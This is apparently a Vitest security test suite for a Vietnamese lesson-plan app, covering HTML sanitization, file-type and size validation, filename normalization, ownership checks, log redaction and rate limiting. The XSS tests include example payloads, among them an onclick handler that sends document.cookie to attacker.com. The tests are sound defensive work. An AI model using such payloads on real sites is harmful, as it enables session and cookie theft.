import { describe, it, expect, vi } from 'vitest';
import { sanitizeHtml } from '../utils/sanitize';
import {
  validateFile,
  normalizeFileName,
  checkFileOwnership,
  MAX_FILE_SIZE_BYTES,
} from '../utils/fileValidation';
import { redactSensitiveData } from '../utils/logger';
import { createRateLimiter } from '../utils/rateLimiter';

describe('Milestone 10: Security, Sanitization and Rate Limiting', () => {
  describe('HTML Sanitization (XSS Prevention)', () => {
    it('removes script and iframe tags from untrusted user/AI content', () => {
      const maliciousHtml = '<p>BÀI BÁO GIÁO ÁN</p><script>alert("xss")</script><iframe src="evil.com"></iframe>';
      const sanitized = sanitizeHtml(maliciousHtml);
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('evil.com');
      expect(sanitized).toContain('BÀI BÁO GIÁO ÁN');
    });

    it('removes inline on-click handlers', () => {
      const maliciousHtml = '<button onclick="fetch(\'http://attacker.com?c=\'+document.cookie)">Click</button>';
      const sanitized = sanitizeHtml(maliciousHtml);
      expect(sanitized).not.toContain('onclick');
    });
  });

  describe('File Validation and MIME Type Checking', () => {
    it('accepts valid PDF and DOCX files', () => {
      const pdf = { name: 'GiaoAn_Lop10.pdf', size: 1024 * 1024, type: 'application/pdf' };
      const docx = {
        name: 'GiaoAn_Lop10.docx',
        size: 2 * 1024 * 1024,
        type: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
      };

      expect(validateFile(pdf).valid).toBe(true);
      expect(validateFile(docx).valid).toBe(true);
    });

    it('rejects DOCM macro-enabled documents explicitly', () => {
      const docm = { name: 'MaliciousDocument.docm', size: 1024, type: 'application/vnd.ms-word.document.macroEnabled.12' };
      const res = validateFile(docm);
      expect(res.valid).toBe(false);
      expect(res.error).toContain('Macro');
    });

    it('rejects files exceeding maximum size limit', () => {
      const hugeFile = { name: 'BigFile.pdf', size: MAX_FILE_SIZE_BYTES + 1, type: 'application/pdf' };
      const res = validateFile(hugeFile);
      expect(res.valid).toBe(false);
      expect(res.error).toContain('vượt quá');
    });

    it('normalizes Vietnamese filenames cleanly', () => {
      const original = 'Giáo án Môn Toán - Lớp 10 (Phiên bản mới).docx';
      const normalized = normalizeFileName(original);
      expect(normalized).toBe('Giao_an_Mon_Toan_-_Lop_10_Phien_ban_moi.docx');
    });
  });

  describe('Resource Ownership Verification', () => {
    it('allows owner to access resource', () => {
      expect(checkFileOwnership('usr_001', 'usr_001', false)).toBe(true);
    });

    it('denies non-owner access unless admin', () => {
      expect(checkFileOwnership('usr_001', 'usr_002', false)).toBe(false);
      expect(checkFileOwnership('usr_001', 'usr_002', true)).toBe(true);
    });
  });

  describe('Sensitive Data Redaction (Safe Logging)', () => {
    it('redacts Gemini API keys and Bearer tokens', () => {
      const logPayload = {
        apiKey: 'AIzaSy1234567890abcdef1234567890abcdef1',
        authorization: 'Bearer secret_token_xyz',
        user: { name: 'Teacher 1', password: 'secretpassword' },
      };

      const redacted = redactSensitiveData(logPayload);
      expect(redacted.apiKey).toBe('[REDACTED]');
      expect(redacted.authorization).toBe('[REDACTED]');
      expect(redacted.user.password).toBe('[REDACTED]');
    });
  });

  describe('Rate Limiter Middleware', () => {
    it('triggers 429 when max request count is exceeded', () => {
      const limiter = createRateLimiter({
        windowMs: 60 * 1000,
        max: 2,
        keyGenerator: () => 'test_ip',
      });

      const req: any = { headers: {}, socket: { remoteAddress: '127.0.0.1' } };
      const res: any = {
        setHeader: vi.fn(),
        status: vi.fn().mockReturnThis(),
        json: vi.fn(),
      };
      const next = vi.fn();

      limiter(req, res, next);
      expect(next).toHaveBeenCalledTimes(1);

      limiter(req, res, next);
      expect(next).toHaveBeenCalledTimes(2);

      limiter(req, res, next);
      expect(res.status).toHaveBeenCalledWith(429);
      expect(res.json).toHaveBeenCalledWith(
        expect.objectContaining({
          success: false,
          error: expect.objectContaining({
            code: 'RATE_LIMIT_EXCEEDED',
          }),
        })
      );
    });
  });
});
